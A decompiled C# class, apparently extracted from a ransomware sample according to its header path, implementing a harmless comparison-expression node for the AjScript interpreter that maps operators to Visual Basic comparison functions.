// Decompiled with JetBrains decompiler
// Type: AjScript.Expressions.CompareExpression
// Assembly: FUNCD, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 38B3918C-7BBD-4048-BF6D-F5A856A1A18A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.Win32.Convagent.gen-2f81e8b71640e7b5770deccc56c23d75240c34a5914dcb138ec2972e624a0f03.exe

using AjScript.Language;
using Microsoft.VisualBasic.CompilerServices;
using System;

namespace AjScript.Expressions
{
  public class CompareExpression : BinaryExpression
  {
    private Func<object, object, bool, object> function;
    private ComparisonOperator operation;

    public CompareExpression(ComparisonOperator operation, IExpression left, IExpression right)
      : base(left, right)
    {
      this.operation = operation;
      switch (operation)
      {
        case ComparisonOperator.Equal:
          this.function = new Func<object, object, bool, object>(Operators.CompareObjectEqual);
          break;
        case ComparisonOperator.NotEqual:
          this.function = new Func<object, object, bool, object>(Operators.CompareObjectNotEqual);
          break;
        case ComparisonOperator.Less:
          this.function = new Func<object, object, bool, object>(Operators.CompareObjectLess);
          break;
        case ComparisonOperator.LessEqual:
          this.function = new Func<object, object, bool, object>(Operators.CompareObjectLessEqual);
          break;
        case ComparisonOperator.Greater:
          this.function = new Func<object, object, bool, object>(Operators.CompareObjectGreater);
          break;
        case ComparisonOperator.GreaterEqual:
          this.function = new Func<object, object, bool, object>(Operators.CompareObjectGreaterEqual);
          break;
        default:
          throw new ArgumentException("Invalid operator");
      }
    }

    public ComparisonOperator Operation => this.operation;

    public override object Apply(object leftValue, object rightValue) => this.function(leftValue, rightValue, false);
  }
}
